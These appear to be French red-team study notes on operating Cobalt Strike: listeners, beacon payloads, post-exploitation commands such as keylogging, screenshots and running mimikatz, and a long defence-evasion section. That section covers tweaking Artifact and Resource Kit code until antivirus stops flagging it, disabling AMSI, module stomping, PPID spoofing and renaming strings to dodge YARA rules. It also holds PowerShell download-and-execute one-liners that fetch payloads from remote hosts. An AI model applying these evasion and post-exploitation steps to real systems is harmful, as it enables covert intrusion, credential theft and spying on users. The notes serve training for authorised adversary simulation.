
Cobalt Strike est un Framework de C2 customisable permettant de se faire passer pour un APT et simuler des TTPs. Permet également de générer des rapports et le mapping du MITRE ATT&CK.

Documentation officielle -> https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm


- [[#Composants]]
- [[#Operations distribuées]]
- [[#Connexion au serveur]]

- [[#Listeners]]
- [[#Beacons]]
- [[#Payloads]]
- [[#Interagir avec les Beacons]]
- [[#Commandes]]

- [[#Post-Exploitation]]
	- [[#Jobs]]
	- [[#Session Passing]]
	- [[#File System]]
	- [[#Téléchargement / upload de fichiers]]
	- [[#Processus]]
	- [[#Keylogger]]
	- [[#Clipboard]]
	- [[#Registre]]
	- [[#Screenshots]]
	- [[#VNC]]
	- [[#Exécution de commandes]]
	- [[#Executer des tools custom]]

- [[#Defence Evasion]]
	- [[#ARTIFACT KIT]]
	- [[#RESOURCE KIT]]
	- [[#Modifier Profile malleable]]
	- [[#BEACON MEMORY]]
	- [[#POST-EX FORK & RUN]]


---
# Composants

## Beacon

Un beacon est un agent de post exploitation, c'est en quelque sorte le Meterpreter de Cobalt Strike mais agit de manière plus furtive.

## Team Server

C2 central. Stocke les informations collectées durant la mission et créer des modèles de données exploitables pour générer des rapports. Plusieurs Team Server peuvent êtres lancés en parallèle.

## Client

Permet de se connecter aux Team Servers. Fait un agrégat de toutes les données afin d'avoir une vue d'ensemble.


# Operations distribuées

Le Framework est conçu pour dédier un Team Server à chaque phase (Accès initial, Post exploitation et Persistance). Cela permet de maintenir un accès en cas de découverte et blocage de l'un d'entre eux.

![[Pasted image 20250910003539.png]]


# Connexion au serveur


![[Pasted image 20250910003712.png]]

Une fois connecté il est possible de se connecter à d'autre serveurs en parallèle.

![[Pasted image 20250910003827.png]]


---
# Listeners

[[#Types]]

[[#Listener HTTP]]
[[#Listener DNS]]
[[#Listener SMB]]
[[#Listener TCP]]


## Types

2 Types de listener :
- **Egress** -> Un beacon egress communique directement avec le serveur (DNS / HTTPS) 
- **Peer2Peer** -> Un beacon P2P redirige le trafic à un autre beacon. Possible d'enchainer les beacon P2P, au final un beacon egress devra être utilisé pour joindre le serveur. (SMB / TCP)

## Listener HTTP

Le beacon envoi des GET requests au serveur afin de récupérer les taches à effectuer puis des POST requests pour envoyer les résultats.

![[Pasted image 20250910004404.png]]

- **HTTP Hosts** -> Liste des hôtes (IP/DNS) avec lesquels le beacon va communiquer. Possible d'y mettre des redirecteurs (Proxy intermédiaires).

- **Host rotation strategy** -> Permet d'établir une rotation si plusieurs hôtes sont utilisés
	- ***Round robin*** -> Chaque hôte est utilisé pour une requête avant de passer à l'autre. (du haut vers le bas)
	- ***Random*** -> Choisit un hôte de manière aléatoire pour effectuer la requête.
	- ***Failover*** -> Utilise le même hôte jusqu'à ce qu'il ne réponde plus x fois ou sur une période donnée.
	- ***Rotate*** -> Utilise le même hôte pour une durée indiquée avant de passer au suivant.

- **Max retry strategy** -> Permet de définir une stratégie d'autodestruction dans le cas ou tous les hôtes deviennent injoignables.
	- ***None*** -> Ne fait rien.
	- ***Exit*** -> **exit-[max_attempts]-[increase_attempts]-[duration][m/h/d]**
		- **max_attempts** -> nb de tentatives max avant l'autodestruction
		- **Increase_attempts** -> nb de tentatives max avant d'augmenter le sleep time entre les requêtes.
		- **duration** -> Durée du sleep time.

- **HTTP host (stager)** -> Définit l'hôte envoyant les payloads stager (qui vont ensuite chercher le payload complet). Possible d'utiliser n'importe quel hôte qui communique avec le serveur.

- **Profile** -> Permet d'utiliser différentes variations de trafic.

- **HTTP port (C2)** -> Port du serveur (idéalement 80, 8080 ou 443)

- **HTTP port (bind)** -> Utile en cas de Portforwarding. (Utilise le port C2 si non spécifié)

- **HTTP host header** -> Sert de Domain Fronting (définit un domain écran pour masquer notre domaine).

- **Guardrails** -> Permet de définir des critères qui s'ils ne sont pas remplis, empêche l'exécution des payloads. (Imaginons que notre beacon soit analysé en sandbox, il ne sera pas exécuté).
	- IP
	- Username du compte
	- nom d'hôte
	- nom du domaine


## Listener DNS

Communique avec le serveur au travers du protocole DNS (fait des requêtes DNS d'enregistrements A, AAAA ou TXT)

![[Pasted image 20250910014819.png]]

Nécessite de créer les enregistrements DNS sur le serveur afin de le rendre authoritatif pour un ou plusieurs sous domaines.

- **DNS resolver** -> Définit les DNS resolvers à utiliser (Utilise par défaut ceux définit sur la Target)


## Listener SMB

Ne communique pas avec le C2 mais sert de template pour la génération de payloads.
Lors de l'execution du Beacon, un named pipe SMB est crée avec le nom définit.
Permet de relayer le trafic vers un autre beacon.

![[Pasted image 20250910022927.png]]


## Listener TCP

Permet de rediriger le trafic vers un autre listener également.
Bind par défaut sur 0.0.0.0 et permet le mouvement latéral.
Possible de bind sur localhost pour la privesc.

![[Pasted image 20250910023526.png]]

---
# Beacons

Les beacons sont des DLL windows injectées dans les processus en File Less (DLL reflective).
Utilise la technique [[3. Process Injection (T1055)]] .

![[Pasted image 20250910025117.png]]

Le Beacon exporte une fonction ReflectiveLoader

![[Pasted image 20250910030653.png]]



## Prepend Loader

Présent depuis Cobalt Strike 4.11, Le Reflective Loader ne fait plus partie du PE mais est préfixé à celui-ci.

![[Pasted image 20250910030245.png]]

---
# Payloads

## Types de payloads

- **Stageless** -> payload envoyé d'un coup. (Plus sécure et plus furtif (pas de RWX en mémoire -> passage de RW a RX avant exécution ce qui n'est pas suspect) mais génère plus de trafic lors de l'envoi)
- **Staged** -> payload envoyé en plusieurs fois.
	- *Stager* -> établi la connexion
	- *Stage* -> composant du payload appelé par le stager
## Securité des payloads

Au lancement du serveur, une paire de clé prive/public est générée afin de chiffrer les communications. Les payloads stageless utilisent la clé publique à chaque communication avec le C2.
Les payloads staged eux sont susceptible au hijacking car le stager ne vérifie pas la légitimité du serveur lors de l'execution.


## Génération des payloads

menu payloads.

### HTML application

Génère un payload au format **.hta** (combine html et VBScript) au format x86.

![[Pasted image 20250910033008.png]]

- **Executable** -> Drop un stager exe sur le disk et le lance.
- **Powershell** -> Lance le stager en mémoire avec powershell.
- **VBA** -> Utilise une macro VBA pour executer le stager en mémoire (requiert Office sur la target)

### MS Office macro

Génère une macro VBA (x86) à coller dans n'importe quel document office.

![[Pasted image 20250910033630.png]]


### Stager payload generator

Semblable à MSFVenom, il permet de générer un shellcode brute au format x64 ou x86.

![[Pasted image 20250910033848.png]]

### Stageless payload generator

Identique au stager mais avec plus d'options

![[Pasted image 20250910033931.png]]

- **Exit Function** -> Définit comment de termine le payload lors de la commande exit
	- *xprocess* -> Met fin au processus entier -> à utiliser si le processus à été lancé par nous.
	- *xthread* -> Met fin au thread qui execute notre payload -> à utiliser s'il est injecté dans un processus légitime.

- **System Call** -> Choix entre syscalls direct et indirects
	- *Direct* -> utilise la version Nt* de la fonction
	- *Indirect* -> Jump sur l'instruction appropriée dans la version Nt* de la fonction (plus discret -> Voir DLL unhooking)

- **Windows stager/stageless payload** -> sort des payloads executables
	- *Windows EXE* -> .exe standard
	- *Windows Service EXE* -> executable fait pour interagir avec les Service Control Manager.
	- *Windows DLL* -> DLL qui contient les exports de fonctions pouvant être appelées avec rundll32 et regsvr32.



### Windows Stageless Generate All Payloads

Genère tous les payloads possible en x64 et x86.

![[Pasted image 20250910040354.png]]

---
# Interagir avec les Beacons


![[Pasted image 20250910041250.png]]

Icone bleue -> Privilèges utilisateur standard
Icone rouge -> Admin local ou privilèges SYSTEM
![[Pasted image 20250910041334.png]]

Pour intéragir avec un Beacon, double cliquer dessus.

![[Pasted image 20250910043639.png]]

## Session Graph View

La vue graphique permet d'identifier les relations entre les beacons.

![[Pasted image 20250910042201.png]]

Le firewall -> Beacon Egress qui interagit avec notre C2 (Le lien vert non contigu = HTTPs)
Lien contigu jaune -> SMB (P2P)
Lien contigu  vert -> TCP (P2P)


## One-Liner

Possible de générer des One liner powershell pour les beacons.

Clique droit sur la session -> **Access > One-liner**

---
# Agressor Scripts

Possible de charger des Agressor Scripts BOF

Aller dans Cobalt Strike -> Script Manager -> Load -> Séléctionner fichier .cna



---
# Commandes

Afficher les commandes

```
help
```

Avoir de l'aide pour une commande

```
help command
```

Forcer un beacon DNS à établir la connexion avec nous

```
checkin
```

Les commandes envoyés sont mises en attente, il est possible d'en envoyer plusieurs avant que le beacon les exécutent.

Nettoyer la file d'attente des commandes

```
clear
```

Les commandes sont categorisés en fonction de comment elles opèrent.

Certaines commandes utilisent l'API Windows, d'autres s'exécutent dans le processus du Beacon, et d'autres s'injectent dans des processus distants en créant un process temporaire et un named pipe (spawn) ou dans un processus déja existant (explicit -> accepte les arguments arch et pid).

**Commandes qui n'exécutent rien mais servent à configurer les paramètres du Beacon** :
- sleep
- spawnto
- jobs
- ppid

**Commandes API seulement (Les plus furtives) :**
- cd
- cp
- ls
- mv
- ps
- pwd
- rm
- upload

**Commandes executés dans le Beacon (Furtives) :** 
- inline-execute -> s'attend à recevoir un BOF (Beacon Object File -> Program C compilé sans Linker) Le Beacon parse le BOF et agit comme Linker et Loader pour exécuter le code.
- Les commandes suivantes sont pré-implémentés comme BOF :
	- dllload
	- getsystem
	- timestomp

**Commandes exécutés dans un process distant (appelé Fork & Run) (Moins Furtives) :** 
- spawn commands :
	- execute-assembly
	- powerpick

- explicit commands (Utiles pour exécuter des commandes en tant qu'autre user si privilèges suffisants) :
	- psinject

- spawn et explicit commands (accepte les deux) :
	- mimikatz
	- portscan
	- keylogger


---
# Post-Exploitation

- [[#Jobs]]
- [[#Session Passing]]
- [[#File System]]
- [[#Téléchargement / upload de fichiers]]
- [[#Processus]]
- [[#Keylogger]]
- [[#Clipboard]]
- [[#Registre]]
- [[#Screenshots]]
- [[#VNC]]
- [[#Exécution de commandes]]
- [[#Executer des tools custom]]



## Jobs

Afficher les jobs en cours

```
jobs
```

Kill un job

```
jobkill <jid>
```



## Session Passing

Consiste à faire spawn une nouvelle session à partir d'une session de Beacon déjà existante.

Utile dans le cas ou le canal de session est lent (dans le cas d'une persistance par ex) et ou l'on veut avoir quelque chose de plus rapide.

On peut utiliser n'importe quel Beacon (DNS, HTTP, SMB ou TCP)

### Commande spawn

Lance un nouveau processus et injecte le Shellcode dedans.

Spawn une nouvelle session avec un beacon HTTP dans un processus 64bit

```
spawn x64 http
```

### Commande spawnas

Identique à spawn mais permet de lancer le beacon en tant qu'autre utilisateur avec des credentials en clair.

Spawn une nouvelle session avec un beacon TCP en tant que user

```
spawnas DOMAIN\user Passw0rd! tcp-local
```

si erreur -> [-] could not run C:\Windows\system32\rundll32.exe as DOMAIN\user: 267

possible de voir ce que signifie l'erreur 267

```
windows_error_code 267
```

L'erreur 267 signifie que le user avec lequel on souhaite spawn une session n'a pas les droits de lecture dans le dossier actuel. Simplement changer de dossier puis refaire le spawnas.

```
cd C:\
```




## File System

Commandes classiques pour interagir avec le système :

- cd
- ls

Possible de lister les disques avec la commande : drives

Possible d'avoir une vue graphique des fichiers avec le file browser (le File Browser garde les données collectées uniquement lorsqu'il est ouvert, s'il est fermé, il doit recollecter les données.)

```
file_browser
```



## Téléchargement / upload de fichiers

> [!Tip]
> Les fichiers ne sont téléchargés que sur le serveur Cobalt Strike. 
> Si volonté de les télécharger sur notre machine après, aller dans View -> Downloads -> Sélectionner le fichier -> Sync Files.

Télécharger un fichier

```
download <fichier>
```

Voir les téléchargements en cours

```
downloads
```

Stopper un téléchargement

```
cancel
```


Upload un fichier

```
upload <fichier>
```


## Processus

lister les processus

```
ps
```

vue graphique des processus

```
process_browser
```


## Keylogger

Capturer les frappes au clavier de l'utilisateur actuel

```
keylogger
```

Capturer les frappes au clavier d'un autre utilisateur (autre processus)

```
keylogger [pid] [x86|x64]
```


Lire les éléments capturés -> View -> Keystrokes
Possible de sauvegarder les keystrokes en local dans un fichier en faisant clique droit -> save


## Clipboard

Possible de lire le presse papier

```
clipboard
```

## Registre

Lister les sous clés et valeurs d'un e clé de registre

```
reg query x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

Afficher une sous-clé spécifique et ses valeurs

```
reg queryv x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
```

## Screenshots

3 commandes possibles:
- printscreen
- screenshot
- screenwatch

Dans tous les cas possible d'afficher les screenshots dans View -> Screenshot
Sauvegarder un screenshot en local -> Cliquer droit -> save

### printscreen

> [!Attention]
> Fait une impression écran et place la capture dans le clipboard de l'utilisateur avant de le récupérer. A utiliser avec parcimonie et privilégier la commande screenshot.

Capture d'écran de l'utilisateur actuel

```
printscreen
```

### screenshot

Utilise une DLL pour effectuer la capture d'écran et n'utilise pas le clipboard.

```
screenshot
```

### screenwatch

Effectue une capture d'écran en continue

```
screenwatch
```

Possible d'espacer les captures avec un sleep.

Capture toutes les 30 secondes

```
sleep 30
```


## VNC

Possible d'obtenir une session VNC. 
Utilise une DLL réflective afin de créer un reverse port forwarding sur la target afin d'établir un tunnel vers notre C2.

```
help desktop
```

Par défaut la session est en lecture seule mais il est possible de prendre le controle de la souris et du clavier avec les boutons en bas. Fermer l'onglet ferme le port ouvert sur la target.

![[Pasted image 20250913011857.png]]


## Exécution de commandes

> [!Attention]
> Mauvais pour la détection mais peut être nécessaire lorsqu'on simule certains APT.

2 possibilités :
- shell
- run


### shell

Exécute les commande à travers du cmd (cmde.exe /c <command).

```
shell <command>
```

### run

Exécute le programme directement

```
run <programme>
```


## Executer des tools custom

Possible d'executer des tools custom comme powershell, seatbelt, mimikatz etc... directement en mémoire.

[[#powershell]]
[[#powerpick]]
[[#psinject]]
[[#Import PowerShell scripts]]
[[#execute-assembly]]

### powershell

Les commandes sont encodés en base64.

```
powershell <command> <arguments>
```

### powerpick

Commande Fork and Run qui permet d'exécuter du PowerShell sans powershell.exe mais en faisant appel à l'API PowerShell.

```
powerpick <command> <arguments>
```

### psinject

Fork and Run PowerShell également qui permet d'injecter une commande dans un autre processus

```
psinject [pid] [arch] [commandlet] [arguments]
```

### Import PowerShell scripts

Possible d'importer des scripts PowerShell depuis notre machine locale. (un seul à la fois)

```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```

Puis possible d'exécuter une commande du module avec powershell ,powerpick ou psinject.

```
powerpick Get-Domain
```

### .NET assembly

Permet d'exécuter du .NET assembly en mémoire grâce à la réflexion DLL qui charge le CLR (Command Language Runtime).

```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe AntiVirus
```

### BOFs

Possible d'utiliser des BOF (Beacon Object Files) contenant des payloads executant des commandes. 

```
inline-execute [/path/to/file.o] [args]
```

ou possible d'intégrer des BOFs avec des alias de commande

https://github.com/trustedsec/CS-Situational-Awareness-BOF


---
# Defence Evasion

- [[#ARTIFACT KIT]]
	- [[#Build un Artifact]]
- [[#RESOURCE KIT]]
	- [[#Build les ressources]]
	- [[#Template.x64.ps1]]
	- [[#Compress.ps1]]
- [[#Modifier Profile malleable]]
- [[#BEACON MEMORY]]
	- [[#Module Stomping]]
	- [[#RWX memory]]
	- [[#PE Headers]]
- [[#POST-EX FORK & RUN]]

## ARTIFACT KIT

- [[#Build un Artifact]]


Collection de stage0 templates > `cobaltstrike/arsenal-kit/kits/artifact/`

Ces templates sont des injecteurs de shellcode mais sont détectables par les anti-virus car ils sont écrit sur le disque.

Le Artifact Kit contient le code source (en C) de ses templates et nous permet de modifier les éléments détectés par l'antivirus.

![[Pasted image 20250919213505.png]]

- src-main : contient le point d'entré des templates exe et dll.
- src-common : 
	- Contient des techniques de bypass de sandbox (`bypass-*.c`) -> dist-readfile utilisé par défaut. README pour avoir les explications des techniques. Possible d'y ajouter ses propres techniques.
	- `Patch.c` contient la logique principale pour performer l'injection de shellcode, avec `injector.c` et `start_thread.c` contenant les fonctions.


### Build un Artifact

> [!Warning]
> Toujours lancer le build sans argument en premier afin d'identifier les valeurs par défaut pour le stage.

Build un artifact

```
./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
```

- technique : lister les technique de bypass à utiliser (séparer avec des espaces) (mailslot, readfile...).
- allocators : API utilisé pour allouer la mémoire.
	- HeapAlloc, VirtualAlloc ou MapViewOfFile
- stage size : taille du shellcode. A moins d'utiliser un loader custom, laisser par défaut.
- rdll size : utiliser pour valider la taille du rdll. Comme le stage size, laisser par défaut si pas de custom loader.
- include resource file :
	- True -> Permet de prendre en compte le fichier `src-main/resource.rc` et modifier le CompanyName, FIleDescription, ProductName etc...
	- False.
- stack spoof :
	- True -> permet d'usurper une zone d'allocation mémoire légitime dans la stack.
	- False.
- syscalls : Définit la méthode de syscall
	- embedded
	- indirect
	- indirect_randomized
	- none


2. Scanner les artefacts avec ThreatCheck -> [[BYPASS AV - EDR#ThreatCheck]]
3. Décompiler le programme et identifier le morceau de code flaggé.
4. Une fois le morceau de code identifié, retourner dans le code source de l'artefact et trouver le morceau de code correspondant.
5. Modifier le fonctionnement du code (par exemple passer d'une boucle for à une boucle while).

> [!Warning]
> Simplement modifier les noms des variables n'est pas suffisant

6. Réanalyser avec ThreatCheck -> [[BYPASS AV - EDR#ThreatCheck]]
7. Refaire les étapes jusqu'à plus de détection.
8. Refaire le build

```
./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
```

9. Importer les templates dans Cobalt Strike : Cobalt Strike -> Script Manager -> Load -> Sélectionner le .cna.
10. Générer les payloads : Payloads -> Windows Stageless Payload
11. Tester les payloads sur notre machine avant de déployer sur la target.




## RESOURCE KIT

Autre type de template stage0 pour les scripts comme PowerShell > `cobaltstrike/arsenal-kit/kits/resource/`.

L'idée est de Bypasser l'AMSI.

- [[#Build les ressources]]
- [[#Template.x64.ps1]]
- [[#Compress.ps1]]

![[Pasted image 20250920003228.png]]
 
 - template.x64.ps1 : Template utilisé pour générer des payloads powershell x64 stageless. (utiliser par des worflows comme `jump winrm64` ...)
 - compress.ps1 : utilisé quand des payloads powershell sont hosté sur Cobalt Strike via le Scripted Web Delivery Attack.

### Build les ressources

1. Build les ressources sans rien modifier.

```
./build.sh <output_dir>
```


### Template.x64.ps1

1. Scanner le script avec ThreatCheck -> [[BYPASS AV - EDR#ThreatCheck]] (option -e amsi)
2. Modifier le script directement.
3. Importer les scripts dans Cobalt Strike : Cobalt Strike -> Script Manager -> Load -> Sélectionner le .cna.


### Compress.ps1

1. Tester d'importer le module en mémoire.

```
IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/a'))
```

 Obfusquer le script avec Invoke-Obfuscation -> [[BYPASS AV - EDR#Invoke-Obfuscation]]

2. Importer le module.

```
Import-Module .\Invoke-Obfuscation.psd1
```

3. Lancer Invoke-Obfuscation

```
Invoke-Obfuscation
```


4. Set le script block à celui de compress.ps1

```
SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```

3. Utiliser n'importe quelle méthode d'obfuscation sauf la méthode 'string'  (%%DATA%%  est nécessaire pour Cobalt Strike)
4. Retenter d'importer le module en mémoire.



## Modifier Profile malleable


1. Se connecter au serveur Cobalt Strike en SSH.
2. Aller dans /opt/cobaltstrike/profiles
3. Editer default.profile ([[C2 Profile]])
4. Redemarrer le Team Server

```
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

5. Build les payloads -> [[#Génération des payloads]]

6. Tester Beacon HTTP en powershell :
	1. Dans Site Management -> Host File
	2. Choisir le payload http_x64.ps1
	3. Définir URI = /test et Local Host = www.bleepincomputer.com
	4. Depuis notre machine lancer une session powershell et charger le script en mémoire
	
```
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
```

		5. Vérifier qu'on a bien une session d'ouverte sur Cobalt Strike.



## BEACON MEMORY

La mémoire des beacons sont de bases obfusqués en utilisant un sleep mask.
Cependant la manière dont la mémoire est allouée est suspecte.


1. Exécuter le Beacon.
2. Utiliser [System Informer](https://systeminformer.com/) (anciennement Process Hacker) pour analyser les allocations mémoire en direct.


3 choses à paramétrer dans notre profile de C2 malleable :

1. [[#Module Stomping]]
2. [[#RWX memory]]
3. [[#PE Headers]]

### Module Stomping

Par défaut le loader reflectif alloue une nouvelle région de mémoire en utilisant une API comme VirtualAlloc -> Cela fait que la région de mémoire créée n'a pas d'utilité ('use' est vide).

![[Pasted image 20250920013756.png]]

A la place d'utiliser `VirtualAlloc` -> Charger une DLL légitime situé dans system32 avec `LoadLibrary` ou `LdrLoadDll`. Le contenu de la DLL sera ensuite remplacée par le shellcode.

> [!Warning]
> La DLL chargé ne doit pas déjà être utilisée par une application sur la cible et doit être assez grosse pour contenir notre beacon.

Sur notre malleable C2 utiliser l'options stage.module_x64 pour charger la DLL

```
stage {
   set module_x64 "Hydrogen.dll";
}
```

![[Pasted image 20250920022457.png]]

### RWX memory

Les régions mémoire en RWX pour une application NATIVE sont suspectes.

L'idée est d'allouer la mémoire en RW dans un premier temps, puis copier les sections du PE dans la zone et leur assigner les permissions suivantes.

- RX pour la section .text .
    
- RW pour la section .data .
    
- R pour les sections .rdata, .pdata, et .reloc .


Utiliser l'option stage.userwx -> false

```
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";
}
```


![[Pasted image 20250920023429.png]]


### PE Headers

Copier le Beacon en mémoire sans son PE Header permet de réduire la surface de détection.
Le Header contient des informations vitales pour charger le Beacon en mémoire n'a pas besoin d'être copié en mémoire avec lui.

stage.copy_pe_header -> False.

```
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";
   set copy_pe_header "false";
}
```




## POST-EX FORK & RUN

Le Fork and Run en post-ex est la méthode la moins OPSEC car un nouveau processus est créée et le shellcode injecté dedans. Par défaut les méthodes VirtualAllocEx/WriteProcessMemory/CreateRemoteThread sont utilisées ce qui est flag.


- [[#CreateRemoteThread]]
- [[#Nom des named pipes]]
- [[#Relation processus parent/enfant]]
- [[#psexec spawnto]]
- [[#Image Load Events]]
- [[#AMSI]]
- [[#Post-ex DLL obfuscation]]

### CreateRemoteThread

Utiliser une méthode alternative, possible d'en fournir plusieurs qui seront évaluées de haut en bas par le beacon lors de l'exécution qui en choisira la plus appropriée en fonction du scénario.

| Option              | x86->x64 | x64->x86 | Notes                                                                                                              |
| ------------------- | -------- | -------- | ------------------------------------------------------------------------------------------------------------------ |
| CreateThread        |          |          | Current process only                                                                                               |
| CreateRemoteThread  |          | Yes      | No cross-session                                                                                                   |
| NtQueueApcThread    |          |          |                                                                                                                    |
| NtQueueApcThread-s  |          |          | This is the "Early Bird" injection technique. Suspended processes (e.g., post-ex jobs) only.                       |
| ObfSetThreadContext |          |          | Risky on XP-era targets; manipulates local/remote thread context. (uses CreatRemoteThread under the hood)          |
| RtlCreateUserThread | Yes      | Yes      | Risky on XP-era targets; uses RWX shellcode for x86 -> x64 injection. (interpreted as CreatRemoteThread by sysmon) |
| SetThreadContext    |          | Yes      | Suspended processes (e.g., post-ex jobs) only.                                                                     |

Privilegier NtQueueApcThread, NtQueueApcThread-s, SetThreadContext et CreateThread.

Dans notre profile de C2 :

```
process-inject {
   execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      CreateThread;
   }
}
```



### Nom des named pipes

Par défaut les named pipes créée sont nommés `postex_hexvalue`.
Facile à détecter par des tools comme sysmon... -> https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml#L863

Définir une liste de noms de pipe names alternatifs qui seront choisit aléatoirement dans notre profile malléable. (# -> valeure hexadecimale aléatoire). Choisir quelques named-pipes convaincant.

```
post-ex {
   set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
}
```


### Relation processus parent/enfant

Les processus enfant apparaissent sous leur processus parent. Par défaut beaucoup de commandes sont injectés dans le processus rundll32.exe ce qui est suspect pour un parent comme msedge.exe par exemple.
Utiliser la commande `spawnto` permet de définir le processus vers lequel sera injecter notre commande Fork & Run.

Par exemple si notre beacon est injecté dans le processus msedge.exe, définir le spawnto sur le chemin absolu de msedge.exe avant d'exécuter notre fork & run.

Depuis notre beacon de session :

```
spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
```

```
powerpick <commande powershell>
```

![[Pasted image 20250920032539.png]]

Possible de définir un processus de base pour le spawnto dans notre profile de C2.

```
post-ex {
   set spawnto_x86 "%windir%\\syswow64\\svchost.exe"; 
   set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
}
```


### psexec spawnto 

Possible de modifier les artefacts laissés par PsExec avec la commande `ak-settings` depuis notre beacon de session :

```
ak-settings service updater
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

psexec sera alors injecté dans le processus svchost.exe et le nom de service sera "updater".

```
jump psexec64 lon-ws-1 smb
```

![[Pasted image 20250920034459.png]]



### Image Load Events

Il doit y avoir une cohérence vis a vis des DLL chargés par les processus. Par exemple ce n'est pas logique qu'un processus enfant de msedge.exe charge la DLL System.Management.Automation.dll.

Faire du PPID spoofing -> Permet de spoof le Parent Process Id d'un autre processus.

> [!Warning]
> Necessite de pouvoir obtenir le handle sur le processus distant (priv SYSTEM).

1. Identifier les processus

```
ps
```

2. spoof un pid

```
ppid <id>
```

3. Définir le processus qui sera lancé.

```
spawnto x64 C:\Windows\System32\msiexec.exe
```

4. Executer commande Fork & Run

```
powerpick <commande>
```


reset le ppid

```
ppid
```



### AMSI

PowerShell et .NET sont surveillés par l'AMSI, ce qui nous empêche d'exécuter les scripts powershell et execute-assemby.


Désactiver l'AMSI dans notre profile de C2 (fonctionne uniquement pour les commandes powerpick, psinject et execute-assembly mais PAS POWERSHELL).

```
post-ex {
   set amsi_disable "true";
}
```


### Post-ex DLL obfuscation

`post-ex.obfuscate` est similaire aux options stage.obfuscate et stage.userwx disponibles pour Beacon.  Il brouille le contenu des DLL post-ex et installe la capacité post-ex dans la mémoire d'une manière plus sûre en termes d'OPSEC.  Certaines DLL post-ex à exécution longue masqueront et démasqueront également leur table de chaînes lorsque cette option est activée.

`post-ex.cleanup` libère le chargeur réflexif post-ex de la mémoire après le chargement de la DLL post-ex.  Cela correspond à stage.cleanup pour Beacon, une option activée par défaut depuis la version 4.11.

`post-ex.smartinject` demande à Beacon de transmettre les pointeurs de fonction clés à la DLL post-ex, ce qui lui permet de se démarrer sans les résoudre à nouveau.

Il existe également des options de transformation qui vous permettent de remplacer des chaînes dans les DLL post-ex.  `strrepex` vous permet de remplacer des strings dans une DLL spécifique et `strrep` vous permet de remplacer des strings dans toutes les DLL post-ex.  Par exemple, nous pourrions remplacer une chaîne dans la DLL post-ex responsable de l'exécution de l'assemblage et remplacer une chaîne générique dans chaque DLL post-ex.

> [!Attention]
> Les strings remplacés doivent faire la même longueur que l'original ou être plus courts.

```
post-ex {
   set obfuscate "true";
   set cleanup "true";
   set smartinject "true";
   transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine"; 
    }
}
```

strrepex names :
- ExecuteAssembly
    
- Mimikatz
    
- PowerPick
    
- PortScanner
    
- BrowserPivot
    
- Hashdump
    
- NetView
    
- Keylogger
    
- Screenshot
    
- SSHAgent


identifier les strings à changer vis a vis des règles YARA -> https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar